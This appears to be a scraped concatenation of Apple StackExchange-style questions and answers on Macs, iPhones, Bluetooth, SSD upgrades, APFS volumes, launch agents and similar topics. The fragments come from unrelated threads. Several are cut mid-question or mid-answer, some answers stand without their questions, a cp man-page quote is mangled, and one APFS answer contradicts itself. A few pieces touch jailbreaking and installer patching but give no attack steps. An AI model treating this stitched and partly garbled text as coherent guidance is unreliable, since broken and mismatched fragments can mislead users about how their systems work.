Right-click Menu\nCreate Context Menu Items in Mac Finder\nApplescript Copy file to a new folder\nApplescript copy files/folders from a source using a second source \nDon't forget: If you develop any such an AppleScript/Automator solution for yourself, then put it somewhere public so that others can benefit from using it as well.

In the last week, my client's emails have become lost, and finally found in the Apple Spam folder. What is Spam? Is it a flag coming from my ISP? I don't see any spam settings in Mail Prefs, and don't know how to change it, since it's an e-mail I've been responding to for years.\nThanks for your help!\nApple Mail 11.5 \nOS X 10.13.6 High Sierra\n\nA: Firstly, Junk and Spam are generally interchangeable terms.\nIn the Mail app Preferences page, there is a Junk Mail filtering tab. If your email provider does Spam/Junk mail filtering, you should leave this off as it will just be redundant and cause confusion.\nYour email provider may mark things as spam/junk and will put them in a Spam/Junk mailbox, which would appear on the sidebar in Mail. You can generally prevent this by dragging emails back to your inbox, but this depends on your email service provider. Mail is only acting as a window into your mailbox, and is not doing any filtering if the above preference I mentioned is turned off.\n", "Q: Can I Open Port 443 on my MacMini without using the Server App? I'm using an AT&T router where I have port 443 open. I did a port scan and it does not show 443 open. I have the firewall open with all the default options listed that Allow incoming connections.\nI'm using Let's Encrypt on my development MacMini server for my SSL certificates. I'm having a problem with accessing my website. I contacted the Let's Encrypt forum and was told that my problem was that port 443 was blocked.\nThis is the only option that I found so far that claims to force open a port. This solution is three years old. I'm not familiar with netcat so I'm reluctant to use it without more understanding on how this works?\nHow to force open TCP 443 on my machine?\nI've also read several solutions that use the Server app. I'm not using the Server app because I had problems with it a while ago. Is there another clean option to turn this port on that does not use it? I'll install it if I need to but I prefer another option if one is available.\nUPDATE 03/13/2019: I just installed the latest version of macOS Server to try and open port 443. The vast majority of features that were available in older versions of the Server app have been removed so I need to find another option to get this done.\n\nA: \"443... connected. Unable to establish SSL connection\" means that the problem isn't related to port 443 being blocked; your version of wget is probably stale (see this StackOverflow post.) \nTry curl instead: curl https://mydomain.com\n(Note: the \"https://\" part is important!)\n", "Q: Any \"Always On Top\" app working on Mojave? My workflow requires a lot of coding, and sometimes pasting code from a text editor to a terminal window. In those occasions, keeping the terminal window \"always on top\" is very convenient. \nUp until High Sierra, I used to use mySIMBL with its \"Afloat\" plugin. It was quite tricky to get it working - one had to disable SIP, install mySIMBL and re-enable SIP again - but it worked fine. It looked like this:\n\nWith Mojave, however, it no longer works. Actually, it does - but SIP must be permanently disabled. I mean not only for installing it, but for using it as well. And I don't want to take the risk of using Mojave with SIP permanently disabled.\nSo, I'm looking for a replacement.

I have an iPhone X with my FaceID registered. I back it up using iTunes.\nIf I restore this backup to another iPhone with FaceID support, will my registered FaceID be restored? Or do I have to register FaceID again?\nI don't have multiple devices to test these scenarios on, and I couldn't find a definitive answer online.\n\nA: FaceID and TouchID are stored locally only on the device in a Security Enclave and never sent across the network.\nAs Justin Pot writes in \"What Is Apple’s “Secure Enclave”, And How Does It Protect My iPhone or Mac?\" on How-To Geek:\n\nThe Secure Enclave boots separately from the rest of your device. It runs its own microkernel, which is not directly accessible by your operating system or any programs running on your device. There’s 4MB of flashable storage, which is used exclusively to store 256-bit elliptic curve private keys. These keys are unique to your device, and are never synced to the cloud or even directly seen by your device’s primary operating system. Instead, the system asks the Secure Enclave to decrypt information using the keys.\n\nSo, your FaceID (or TouchID for that matter) is tied to a specific device and can not be restored on a different device from a backup.\nYou can read more about it in the Wikipedia article on FaceID.\n", "Q: Full-screen applications on 90 degree rotated external monitor incredibly laggy I have a 2018 MBP running 10.14.3 -- it's connected to a dock with 3 external monitors. Two are through display port and one through HDMI. The dock connects via USB-C.\nI have one monitor that's rotated 90 degrees. On this monitor, if I have a full-screen application, the UI of that application lags immensely. I've tested multiple applications. If I drag the full screen application to my other external monitor (both are DP), the UI is snappy as expected. Both monitors are the same model. As far as I can tell, the only difference is that one monitor is rotated 90 degrees and the other isn't.\nIs there anything I can try to resolve this? Some Notes:\n\n\n*\n\n*The dock has updated drivers (third party displaylink)\n\n*I've tried rebooting\n\n*It doesn't seem to happen for the entire application\n\n\n*\n\n*For Outlook, the mouse is very responsive in the reading pane, but lags when I hover over my folders.\n\n*For Slack, the entire UI is laggy\n\n\n\nA: The problem lies with the fact that the monitors are connected via DisplayLink. The DisplayLink drivers are notoriously known for having extremely bad performance when rotation is used. This has been a problem for years.\nThe same type of problem exists on other platforms such as for example Linux. My understanding is that at least part of the problem is that instead of the graphics hardware doing the rotation, it is actually done in software on the main CPU inside the DisplayLink driver. This makes it much slower than ordinary.\nThe only real solution is to use a different dock that doesn't use DisplayLink. Usually you would need a Thunderbolt 3 dock. Those usually offer DisplayPort and/or HDMI. You could also connect the rotated monitor directly to the MacBook Pro assuming you have a left-over Thunderbolt 3 port.\n", "Q: Finding video drivers for macOS I'm curious as to a problem I have. So, I bought a 2009 Mac Pro recently (with only coins, it was pretty epic) and did a little trickery to get macOS Mojave onto it. However, the video card preinstalled is the original and pretty weak video card. I was hoping to put at least something better into it, but every card I try, it doesn't display anything. I've been informed that (unlike Linux, it seems) I need to get drivers -- macOS is not plug-and-play with video cards. However, I can't seem to find driver downloads (macOS versions) for any of the various cards I've tried -- if I find anything, it's Windows only). I was wondering if Apple has a different way to install video drivers, or perhaps there's a website somewhere where video driver packages run free through the tall grass.\nI've tried several cards, including the NVS 300 (which I was just trying to see if it was at least a bit better), as well as a red FoxConn card (which I can't even find Windows drivers for).\nAny insight would be appreciated.\n\nA: You cannot just use any graphics card with a Mac, unfortunately. You will need to have both driver support as well as a specific Mac firmware on the graphics card itself.\nIt is possible to buy non-Mac graphics cards and flash the needed firmware onto the card. It only works with specific models though. Apart from that you'll need to buy the \"Mac-version\" of the graphics card to get the right firmware. The selection is very limited compared to what you're used to on Linux.\nIn regards to drivers - if you choose an AMD-based graphics card, the driver is almost always included with macOS. If you choose an Nvidia-based graphics card, you can download the driver from their web page.\nYou can also find a good driver listing for Nvidia cards here:\nhttp://www.macvidcards.com/drivers.html\nThe same web site also offer Mac graphics card for sale, as well as listing which ones are compatible with each model of Mac Pro.\nThe official Apple list of supported graphics card for your Mac Pro is available here:\nhttps://support.apple.com/hr-hr/HT201805\nNote that there are options out there that aren't officially recognized by Apple, but work well anyways.\n", "Q: Can you reset the SMC an all Mac laptops by pressing power for 5 seconds after disconnecting the battery? I've always had this doubt and some clarification would be very welcome.  On Mac notebooks with non-removable battery (such as the MacBook Pro 2014), is the SMC reset by disconnecting the battery and pressing power for 5 second as is done on older Macs with removable batteries (such as in cases where Alt or Command keys are not working).  \nHere's the Apple article on SMC reset:\nhttps://support.apple.com/en-gb/HT201295\n\nA: No, on Mac notebooks with non-removable batteries you \"press Shift-Control-Option on the left side of the built-in keyboard, then press the power button at the same time.

It doesn't just discover them - it automatically pairs with them and immediately interferes with legitimate connections to my AirPods or other bluetooth headphones. It breaks and chops the audio into complete, unintelligible, stuttering uselessness.\n\nI have to manually disconnect these things every 1-2 minutes. \nI've looked for a few solutions:\n\n\n*\n\n*One mentions turning Handoff \"off\". My Handoff is, in fact, off.\n\n*Another mentions that this issue only crops up when a browser window is open; this happens to me regardless.\n\n*Another mentions using Terminal to 'sudo write' the DontPageAudioDevices value in the bluetooth .plist file in my library to '1'. I have done this, and it fixed the problem partially: the connections to this device have become less frequent, and my computer will automatically disconnect after a few seconds, but usually not quick enough to prevent it from disrupting my audio just the same. \nI'm running out of places to treasure hunt for a solution. I don't know why my computer is so stubbornly determined to connect to these random, unknown devices to the point of disrupting fundamental user experience.\nDoes anybody have a legit solution to force my computer to cease this behavior? This seems like a massive bug that doesn't have a lot of attention. Any help is appreciated. \n\nA: Running Mojave 10.14.5 and also experiencing the EXACT same issues as described. \nCurrently tried deleting bluetooth preferences files, resetting the bluetooth module, and restarting my macbook to see if I run into the same issues. \nIf same issues persist, then hotel rooms may be a pain in the a** till a concrete solution is found.\n\nUPDATE\n\nFollowed answer in this post to add a MAC address to the \"IgnoredDevices\" in the bluetooth.plist file and it seems to be working.\nUsing the terminal, Type sudo defaults write /Library/Preferences/com.apple.Bluetooth.plist IgnoredDevices -array-add '' \nGood Luck! \n\nA: If you're in a hotel room, look on the back of the TV.  You may find a device bolted back there serving up games, movies, etc.  Pull the power connection.  Go to your bluetooth menu and disconnect the connection, if it's still there.  Problem solved.\nI've confirmed that this was in fact the case in my hotel room recently.  I was able to turn the problem on and off simply by cycling the TV device.  I'm guessing they want you to play stuff through the TV from your computer.  Nothing overtly nefarious - just sort of thoughtless on their part.\nGranted, Apple shouldn't allow this - you should be aware of and in control of any device that wants to connect to your computer.\n\n", "Q: iTunes splitting albums containing songs from multiple different artists \nAs seen here, my iTunes is splitting my albums up.

In the past, I have changed my password when this has happened - but despite using a unique, multi-character password - these popups have occurred at least half-a-dozen times.\nPosts from Apple such as referenced on this SE question mention that you should refuse requests you do not recognize. They also say you should change your password frequently - but what they don’t mention is whether it is very important to change your password every time. \nDo these two-factor pop-ups only occur when someone has guessed your password?

This is if I erased the macOS container rather than the partition it self?\n\nA: When Mojave is installed, you need to choose a APFS volume. However, the operating system is not just installed to this volume. Additionally, three other hidden APFS volumes (Preboot, Recovery and VM) are created, if they do not already exist. The preboot files are placed in a folder in the Preboot APFS volume and the recovery files are place in a folder in the Recovery APFS volume. In both cases, the name of the folder is the same as the UUID assigned to the APFS volume you chose when installing Mojave. The VM volume is used to store the sleep image and the swap file.\nIf you create a new APFS volume and install Mojave to this volume, then the three hidden volumes are reused. Again the preboot and recovery files are placed in a folders with a name the same as the UUID of the new APFS volume.\nIf you delete a APFS volume that was chosen for a Mojave installation, only this volume is removed. The three hidden volumes remain and still contain and the same files. To remove the folders containing the preboot and recovery files, you have to manually mount the volumes and remove the folders. (For example, use the diskutil mount command to manually mount each volume.) Since the space taken up by these folders and their contents is fairly small, most users will probably elect to just leave the folders intact on these hidden volumes.\n\nThis is a long way of saying: The removal of Mojave by deleting a APFS volume does not alter any other APFS volumes.\n\nWhat I wrote above also applies to High Sierra when installing to a APFS volume.\n\nA: It seems to be that no matter what container is removed in a APFS partition, all other volumes will be unaffected.\nTo test this, I created a new APFS partition as the following:\n\n\n*\n\n*Shared data - 100GB\n\n\n*\n\n*Container 1\n\n*Container 2\n\n\n\nEven if I deleted Shared data, both Container 1 and Container 2 were both unaffected. If I then removed Container 1, Container 2 would still exist. It is only if the actual partition is erased rather than the container being erased, formatted or removed, that the others are unaffected.\n", "Q: How to use a kext that has just the info.plist changed without codesign or SIP disabled?

After some extensive research, I've arrived at the following solution.\nmacOS Version: This was tested on macOS 11.0 Big Sur and on macOS 10.15 Catalina as well\nCustomizing the default dimensions of the Finder window\n\n*\n\n*Open the Terminal application, enable the \"Quit Finder\" menu item\ndefaults write com.apple.finder QuitMenuItem -bool true; killall Finder\n\n\n\n*In Finder, open a new window and configure its size/dimensions to the exact way you like it\n\n\n*Quit the Finder application (⌘ Q)\n\n\n*Launch the Finder application\n\n*\n\n*When you first open the Finder application, a window is not created, which is a bit unintuitive ¯\\_(ツ)_/¯\n\n\n\n*In Finder, create a new window (⌘ N)\n\n*\n\n*The position/dimensions of this window should be exactly the way you like it. Finder determined what the position/dimension ought to be using configurations stored in the ~/.DS_Store file. Every time a Finder window is moved or resized, the ~/.DS_Store file will be written to.\n\n\n\nAny future windows should default to opening with this size/position on the screen.\nNote: If you try to open a Finder window on a larger screen, don't expect the window to be centered. Finder doesn't store the relative offset of the window to the screen, it stores the X/Y pixel offset from the top-left corner\nNote: Don't try and be clever by removing write access to ~/.DS_Store, it didn't work out for me. Finder's reaction to losing write access is to ignore the ~/.DS_Store file completely, causing every new window to open with the factory-default window configurations\n", "Q: How do I remove a substring from system_profiler with a posible if then?

Can my iTunes & App Store account  be separate from my iCloud, Messages,and FaceTime accounts? \nCan I be signed into iTunes with separate account from iCloud, iMessage, etc, at the same time on the same iPhone? \nCan I have a separate account (Apple ID) for iTunes purchases than my iCloud account? \n\nA: Yes that is what I have.\nI have this because my iTunes account predates apple mail and backup which are the predecessors of iCloud. The latter had to be a @me.com address and my iTunes account was not. The usual problem is that Apple has not provided a way to combine these accounts for those who want to. \nYour could have a third email with Apple for development membership. And your iTunes login could differ from your Mac apps store login but that gets too confusing. \n", "Q: Safari won't load pages after system restore I hope someone can advise please...\nA few days ago I had to restore my whole system from Time Machine backup after a power outage stopped my Mac from booting up.

Started on g0blin however when I try and use totallynotspyware or DoubH3lix JB, it tells me my device is already jailbroken.. Even though I lost my G0blin icon as well as its listing in Device Management.. My only options are to either use G0blin to re-jailbreak, or format and then use Meridian.. Bottomline, once you use one method, you stuck on that method unless you do a complete wipe is what I'm seeing.. I don't think a lot of people realize that. I'm only basing this off my device not being about to be re-jailbroken and getting the error message I mentioned earlier. So for us JB users who lost our jailbreaks, our only option may be to hope and wait until the Apple server issue is resolved, or hope that Saurik can come up with a update of some sort for Impactor so we can get back to JB business. Otherwise you have to format your OS and start from scratch.. Which sucks for me because I use alot of tweaks and repos. This is one of the reasons why I wont give up on my ios 9.0 device even though its severely out of date.. Cause I stay on full jailbreak even if my battery dies.\n", "Q: Macbook Pro (mid-2012) battery not identified (shows X) after SSD install I recently upgraded my MacBook Pro (mid-2012) HDD to SSD.\nOnce SSD install was complete, my macbook did not start, however when plugged into power, it started booting, and worked normally.\nThe battery was in decent condition, and was always lasting 3+ hours.\nI tried SMC reset, and PRAM reset few times in last few days, however no change in status. On removing the power adapter, it goes to sleep mode.\nVery annoying that now onwards, I always have to plug in the power for doing any work.\nAny potential hints ...\n\nA: Based on what you’ve described, it sounds like you may have accidentally damaged something internal during your upgrade. Since Apple Hardware Test didn’t turn up anything, ordering a replacement battery is a reasonable next step. If that doesn’t work, then there must be damage to the logic board. You can get tested replacement boards for around $200 or so on eBay. \n", "Q: How to tell the difference between a legitimate Apple request for my password, and an app phishing attempt?

Also the single charactered directories like 0, C, T.\nWhat do they mean or what convention do they follow?\n\nA: The reason for having these folders instead of a more simple /tmp that you might know from other systems is to prevent a number of security issues. Mainly some programs create files/folders/pipes in /tmp that could be used to exploit that program or user data. Therefore these programs need to ensure that the file permissions on those files are such that other user's programs cannot access them. \nThe problem is that this is sometimes forgotten or ignored, and this creates security holes. This is not only the case on macOS, but also on Linux that you mention as your comparison. There exist similar solutions on Linux to this problem, but contrary to macOS, they're usually not installed by default on a home user setup. On Linux these solutions are known as \"polyinstantiated /tmp directory\" and \"PrivateTmp\".\nThe solution on macOS is to have a seperate temporary files folder for each user. This way one user cannot interfere with other user's temporary folders (due to name clashes or intentionally). \nThe placement in /var/folders is most probably just to keep it away from /Users, which would otherwise be a logical place to store something for each user. The reasoning is that this folder contains things that are temporary of nature, and therefore you do not want it in /Users, which could be a network share on a server, and most probably included in backups, etc.\nThe odd name \"k7jkgy2s3_99p4vhlbx3\" you see is actually just generated from the unix uid (user id, 32-bit) and the users uuid (universally unique identifier, 128-bit). Those two are concatenated and then converted into a file name by mapping each set of 5 bits to a character from the set '0123456789_bcdfghjklmnpqrstvwxyz'. This makes it harder for programs to intentionally opening up file paths for other users, as they would need to know this name in advance.\nThe folders \"pd\" and \"zz\" that you call TLDs are simply the first two characters of the above mentioned encoding. The idea is that if you have a large corporate system then you wouldn't want to have thousands of folders (one for each user) inside the same folder. Instead you have fewer folders that are combinations of two characters (like pd, zz, bc, etc.) - and in each of those you then have for example hundreds of folders for those users.\nThe folders below that again, \"C, T, 0\" are just identifiers to specify that the contents of those folders are \"caches\", \"temporary files\" and \"user files\" accordingly. \n", "Q: Taptic Engine stopped working on my iPhone 6s One fine day, the Taptic engine on my iPhone 6s decided to stop working.

There is however, an R option:\n\n-R    If source_file designates a directory, cp copies the directory and the entire subtree connec of the directory are copied rather than the directory itself.  This option also causes symbolic links to be copied, rather than indirected through, and for cp to create special files rather than copying them as normal files.

This is because they convey the number of sectors on the drive as a 32-bit number only. Your disk (3 TB) requires 36-bits to describe the number of sectors. This would make the drive report as approx. 750-800 GB instead of the correct size.\nYou'll need to use a different adapter to connect the disk to solve this.\n", "Q: Automator - Launch terminal at certain folder Is there a way in Automator to open the terminal application at a certain folder location with 2 tabs at that location?\nSo for example open terminal with 2 tabs that have already changed directory from the root folder to Documents/Websites\n\nA: Terminal can be finicky beast when it comes to automation; however, with the use of UI Scripting the following example AppleScript code can be used in Script Editor and saved as an application, or in Automator in a Run AppleScript action.\nNote that using UI Scripting may require accessibility privileges be granted.\nThis was tested and works under macOS High Sierra.\ndo shell script \"open -a 'Terminal' ~/Documents/Websites\"\ntell application \"Terminal\" to activate\ntell application \"System Events\"\n    keystroke \"t\" using {command down}\n    keystroke tab using {control down, shift down}\nend tell\n\nThe example AppleScript code above will open a new Terminal window to the specified location and then open a new tab to the same location while setting focus back to the first tab.\n\nNote: The example AppleScript code is just that and does not contain any error handling as may be appropriate.

They did not have a solution for this issue.\nMy tested and working solution is as follows:\nI bought 2 things\n\n\n*\n\n*HDMI Cable (one end connected to external monitor)\n\n*USBC to HDMI converter (one end connected to macbook)\n\n\nNow, the macbook does not charge because of external monitor connection.\n\nA: Use Apple's optimized charging feature.  This may not have been available when the question was originally asked but anyone with a similar concern has this as an option today.  (That is unless Apple changes things again in the future.)\nApple documentation on the feature is here: https://support.apple.com/en-us/HT212049\n", "Q: My mac is starting slow. I know login items, CleanMyMac. What else? My MAC has a slow start-up time (at times, 5s or more before initial black screen with Apple logo).\nI am aware of login items. I have used CleanMyMac. Is there anything else I should check for?\nThank you :)\n\nA: CleanMyMac should be used with caution, or not at all. It is not recommended as a general trouble-shooting step. I would recommend EtreCheck , which provides you with a useful report about problems, incompatible software, and other concerns. You could edit your question to include any items that it flags. (Don't just copy and paste the whole thing, as it's quite long.)\nFirstly: What's your storage like? Mechanical hard drive? How old? How full? What model of Mac, e.g. \"Late 2012 13\" MacBook Pro\". What MacOS version?\nAre you seeing slowness at any other stage? Problems that early are unlikely to be caused by user software.\n", "Q: Is there a shortcut to connect Bluetooth headphones on iOS? Every time I want to use my Bluetooth headphones with my iPhone (iOS 12) I have to open Settings, tap Bluetooth, then select the device. \nIs there a way to connect with less friction?\n\nA: Confirm that your iPhone Bluetooth is always on\nConfirm that you don't have a competing device trying to connect to your headphones\nDepending on your headphones, they may have a parameter in which they only auto-connect to the last device.  Do you connect them to anything else?\nExperiment a little bit with the connection - What is the exact sequence by which you try to get them to auto-connect?  Maybe you need to unlock your phone before turning on your headphones?  Or try opening whichever app you're using to listen to music (I assume) before turning on your headphones.\nIf none of that is useful this article on AppleToolBox discusses various Bluetooth troubleshooting specifically written following the iOS 12 update.\nGood luck!\n", "Q: Concerns re: upgrading to an OWC Aura Pro SSD on my 2015 Macbook Pro 15\" retina Looking to upgrade HD space on my 2015 MBP 15\" — considering purchasing the OWC Aura Pro 1TB drive, but am quite wary of the many negative reviews I've seen surrounding it (overheating, battery issues, trouble booting).. \nDoes anyone have any real positive experience with this drive upgrade, or any other recommendations? \nI'm honestly feeling most confident about purchasing a Samsung external SSD and velcroing it to the front of my machine. \nAny thoughts greatly appreciated :^) \n\nA: You can pick up secondhand Apple OEM cards on sites like eBay very reasonably. I bought a 512Gb Apple card for my 2014 MBP, which has doubled both the original capacity and speed, (as it's a newer 4x PCI lane model).\nAlternatively, there are adaptors that allow more generic M2 cards to be used.\n\nA: To play it safe in terms of spec, buy a used Apple drive.\nTo save money and get more speed: It may depend a bit on the exact model of MacBook Pro. If it has a discrete GPU then heat will be more of an issue. If it's an Intel iGPU only, things are much more relaxed. \nIt's not so important to stick to the specific brand (which I would recommend otherwise most of the time).\nMost issues with replacement SSDs for this model come to down to connection problems. With a drive from that manufacturer/vendor, I'd say exchanging a faulty drive or a simple reseating of perfectly fine module should solve these problems.\nBut the more flexible and cost effective way is going for an established seller and manufacturer of M2-adapters. There are quite some a bit too cheap offerings out there. \nThen look for aa matching SSD chewing gum strip. That is a bit tough for dGPU MBPs. Some drives do drain quite a bit of power and do get hotter than others.\nLooking for your personal sweet spot might require some serious spec digging. I used a Samsung 970evo in this configuration on a few machines, and it does drain too much power (tolerable) and it can get a bit too warm (again: tolerable), in an Intel iGPU only MBP 2015. \nComparing specs and sensor readings show significant differences between the stock drives and the replacements. In real life this was negligible in terms of fan speed or battery life. This would not be the case if you'd power another external drive, which would draw quite a bit more pwer from the battery.\nIf it's still under warranty/AppleCare, keep in mind that you need the original drive (re-installed in need) should you want from Apple to service such a unit.\n\nA: They are worth it when they work, just make sure you have an external backup in case it does fail.\nFail/success rate with OWC's Aura SSDs really depends on the manufacture date / batch. I have used them in Mac Pros, I had three of them fail completely within a few months, but the latest ones have been humming along for a few years now.  \nOWC is pretty good at replacing the failed SSDs, I really want to chalk it up to bad memory chips.\nI always start with a USB3 enclosure and Samsung SSD for my clients whose internal HDDs or Fusion drives have started to fail.  I eventually go in and internalize these SSDs in batches all at once, since there are typically at least three or four HDDs that have started to fail.\n", "Q: Change Bundle ID when \"upgrading\" to an organization from individual dev account? I created an app 2 years ago and have the bundle ID with my name in the ID (com.joshXXXX.YYYYY). I did not have a business at the time and I read it was okay to use my name. Fast forward to today I have a small team and feel the need to change my individual account to an organization. I would like to also set my Bundle ID as it should be for good practice (com.companyname.xxxxx). \nCould this change be done with the account change to an organization or do I have to make a whole new app with a new Bundle ID?\n\nA: The answer is somewhere in between actually.\nIf you setup a new organization account while keeping your individual dev account, you can transfer the app from one account to the other. In this process it is possible for you to choose a new bundle-ID for the app as an update of the app. \nHowever, the end-users devices will treat it as a \"new app\", which means that it will require them to update the app and the app will have \"forgotten\" any stored credentials in Keychain, and if you have any kind of sharing with other apps you have made, that group membership will be broken.\n", "Q: Cannot seem to install VMware vCSA 6.7 cert on macOS 10.13.6 High Sierra Trying to install the web certificate for my vCenter Server Appliance (vCSA 6.7) on my Mac Mini (running macOS High Sierra 10.13.6). I download the cert.0 file, change the extension to .crt and double-click the file, Keychain Access opens...but then nothing. The cert does not get installed. This is exactly how I've always installed the cert on machines before. Where could be going wrong here? \n\nA: Resolved. I followed the instructions here (which was already getting done by the OS), but had to just manually \"trust\" the CA. \n", "Q: Restore my Mac from a Time Machine backup on my Time Capsule I don't use the wifi or router options of my Time Capsule, I only use its Ethernet. Do I need to activate the wifi in order to perform a restore? Thanks\n\nA: No you don’t. It will work fine if you plug in Ethernet to any port except the wan port no matter what the settings. \nYou could reset the time capsule if you want to be sure it’s in normal order and then the password will be known so you can reset it if needed to use the WAN port or otherwise look at the settings or know the passwords to the disk and management level.\n", "Q: What are the various auto launch paths mean in OSX? I'm trying to track down sneaky apps that launch upon reboot. They are not in System Preferences > Users and Groups > Login items and the in-app preferences for auto starting is disabled too for them. I did find them here:\n~/Library/LaunchAgents\n/Library/LaunchAgents\n/Library/LaunchDaemons\n/System/Library/LaunchAgents\n/System/Library/LaunchDaemons\n\nWhat do each folder mean? Does removing the file from here simply mean the OS is won't find it on startup?\n\nA: This is described in the launchd man page:\n\n~/Library/LaunchAgents          Per-user agents provided by the user.\n /Library/LaunchAgents          Per-user agents provided by the administrator.\n /Library/LaunchDaemons         System-wide daemons provided by the administrator.\n /System/Library/LaunchAgents   Per-user agents provided by Apple.\n /System/Library/LaunchDaemons  System-wide daemons provided by Apple.\n\n\nIf you want to remove something from starting, unload it using the launchctl utility:\n$ [sudo] launchctl unload foo.bar.plist\n\nIf there's a \"sneeky app\" that persists across reboot, it would most likely be in the first three; the last two are \"Apple only.\"\n\nA: The items in the /LaunchAgents and /LaunchDaemon folders are launchd property list files that configure those background tasks.  Files in the local and user Library folders would be for items that have been installed for all users or a particular user, respectively, while those in the System folder are, well, part of the system, and really shouldn’t be messed with.  Usually you would use launchctl to load or unload daemons and agents.\n", "Q: Apple ID locked - reset password So my son forgot the password of email and Apple ID password.\nWhen we go to reset, after we enter the Apple ID, it says it will send instructions by email to ****@icloud.com\nHe can't get in his email and it's the only option we have.\nIs there any way of doing this still or is he basically out of luck?\n\nA: You'll need to contact Apple support about this, as they have tools to help recover Apple IDs like security questions, backup emails, and simply verifying your biographic information against your Apple ID. \n", "Q: Bypassing the Failed Disk \"Read Only\" Mode On macOS, if a disk is failing, you will sometimes get the message below. The OS will put the disk into read-only mode. You can get your files off of it but you can't write to it.\n\nMy question is, is there any way to bypass this, and put the disk BACK into normal read-write mode? \n\nA: Have you tried repairing the disk from recovery HD or while booting into MacOS from a different hard drive? \nIf you truly want to be able to write to that disk again I would recommend this attempt: Clone the HD to a different HD. Check the health of the new HD and make sure all the files are accountable. Then reformat the previous HD, check the health then put the files back...   However, the disk may be writable again, it’s not going to be reliable. \nIf I were you, I would get ready to retire drive.\n", "Q: On iOS how to view the tweets of a particular user in Twifferific and Tweetbot Let's say I found in a bio the twitter handle @BarackObama (or even a less popular one) and I want to quickly look at the tweets of this user. \nI'm having a hard time finding an easy way to do this in Twitterrific. Is it possible? How do I do it? \nPlus I'm thinking of switching to Tweetbot - how do i do it in this app?\n\nA: In Tweetbot you can easily do it the following way: \nGo to the search tab and use the “Users with“ option. Than type type (or paste) the twitter handle (e.g. @BarackObama). At the top of te search results you find the profiel of that person. Tap on it and go to tweets.\nThis works quite similarly in the official Twitter app.\n", "Q: Adding a second monitor via ethernet My DisplayPort connection is buggy and will only work when in a position that I can't ever seem to find. I've sent it off to repairs and the guy said that the board connecting to the socket is cracked and needs to be replaced, but he couldn't find a new board to replace it with.\nBecause of that, I'm wondering if I can connect my MBP to my TV monitor using the other outputs on my MBP instead of using the DisplayPort. This has led me to this and has left me wondering, is it possible to just connect an ethernet cable from my mac into that and then my TV?\nThere is an option listed in the hardware settings of the Ethernet section in the network settings pane that mentions AVB/EAV Mode, which it apparently allows streaming audio / video over ethernet?\nTo me it sounds like it would work, but I want confirmation before I go out and buy these adapters.\n\nA: I'm not sure if macOS supports video over AVB, I've only seen AVB audio products in use w/ macOS so far.\nProbably a viable alternative would be to hook up an Apple TV to your TV and use it for display mirroring/extending via AirPlay.\n\nA: The device you linked to is HDMI over CAT5/5e/6 cable, not Ethernet.  There's a major difference.  It's sending video signals over the 4 pairs of wire, not establishing a TCP link between the two devices.\n\n\n...is it possible to just connect an ethernet cable from my mac into\n  that and then my TV?\n\nYes, but you need more than just a Mac that supports AVB.  You need a device that is an AVB audio device.  In other words, you can't just stream audio/video to any device with an Ethernet port.\nIMO, AVB is a nice feature, but it won't have the reliability and quality of a proper DisplayPort connection.  Keep in mind that DP v1.4 has 32Gb/s bandwidth where as typical Ethernet is only 1Gb/s.  \n", "Q: iTunes thinks there is a podcast on my ipod when there isn't Every day I listen to podcasts.

I got an USB-C 3.1 Gen 2 Enclosure for it. I have tried it on 3 different 2017 and 2018 macbook pros and an iMac. The Max read/write speed that I can get is 40MBps. I thought the problem might be with the enclosure so I tried 4 different enclosures and still same result. I installed the SSD through PCIe to a desktop and read/write speed were astonishingly high.\nI got a Samsung T5 External SSD and even with one I have the same problem. I have seen many reviews of T5 on youtube with Mac which all were satisfied. Am I missing something? Do I need some sort of Driver for it? I’m running a 2018 Macbook Pro with MacOS Mojave\n\nA: I own multiple Samsung T3's and T5's. They are incredible.\nThe cable is important, and unfortunately, it's impossible to tell which cables are intended for which purposes.\nYour 2018 MacBook Pro with Mojave (I have a 2017) does NOT need any kind of driver to use the drive. There's an encryption app on the drive that's worth installing so that you can secure the contents, but that's orthogonal to speed.\nBe sure you're using the short cable with the velcro bits when connecting to your T3/T5. For some of my Samsung T3/T5's, the old-style USB-A connector cable is the best one for performance. \nDownload the (I think still free) Blackmagic Speed Test from the Mac App Store and check the actual performance. Then change cables and you'll see what I mean.\nAs a rule, if the cable is more than 6 inches long, it's NOT for best performance. If the cable has the Thunderbolt symbol on it, it MAY be for performance, regardless of whether it has a USB-A or USB-C connector on the business end (toward your Mac). Also, DO NOT connect your T3/T5 through any kind of cable extender or dock. There's a distance limitation that you will run into if there's any kind of middle man device.\nBefore you down-vote me, please do what I've suggested. I literally have a dozen of these things, each 2 TB/$500.  \n\nA: Had the same problem just now with a Samsung 970 EVO Plus. Was using a 2 ft USB-C cable, and only getting 40 MB/s. Swapped out with a shorter cable and getting over 1000 MB/s. I should be seeing higher numbers though, so I'm going to purchase the highest quality cable I can find. Definitely the cable in this instance.\nEDIT - It also seems the cable must be rated for USB-C 3.1 Gen 2... otherwise it doesn't matter what length you have.\n\nA: Problem was quality of the cables. the cables were using the USB-C connector, but as you may know not all USB-C cables are equal. most of them are only intended for charging at low speeds and are not suitable for hight speed data transfer because they don't fully support USB-C specifications. They only use the connector. ( most probably with less wires inside the cable than required. not all pins are connected )\n", "Q: Download Mojave on a non-Mojave suitable computer I want to do a fresh install (and SSD upgrade) of Mojave on a mac-mini that currently runs Mojave, but whose performance is so horrendous that it is barely usable1.  Easy .. just download Mojave and create a bootable installer and I'm off to the races.\nHowever, the system that I want to use to create the bootable installer is not capable of running Mojave (see my previous question), and when I go to download the installer from the App store, Apple stops me with a message saying:\n\nWe could not complete your purchase.\nThis version of macOS 10.14.3 cannot be installed on this computer.\n\nIs there any way to get around this limitation?  I am not attempting to install Mojave, just download it to a working system.\nEdit \nNote that I the suggested dupe is not a dupe of my problem.  The nominal answer suggests using the direct links on the App store to download the installers.  But as I mentioned above, that is what I have already tried to do (and have failed with the above noted message).\nI am also trying to do the opposite of that question.  I am trying to download a newer version of macOS onto to a older computer.\n\n\n\n*\n\n*And I've gone through all the standard checks and can't see anything that would cause the situation.  But there seems to be lots of people suffering unexplainable slowdowns.  This fresh install and new SSD is meant as a hail Mary.  And at $70 for a 500GB Mushkin SSD it is a no-brainer anyway.\n\n\nA: Tetsujin is correct in that using your recovery partition to do a clean install on your Mojave-supported Mac Mini is ideal.  You can then download Mojave from the App Store as usual.\nIf that is not a viable solution for you:\nAfter reading through the extent of the information given to you in your previous question, would recommend you use dosdude1's Mojave Beta installer tool.  Create your USB installer, install on the Mac Mini's new SSD, and then immediately upgrade to the full version of Mojave\nAlternatively, if you're feeling brave, you can follow the instructions here to obtain 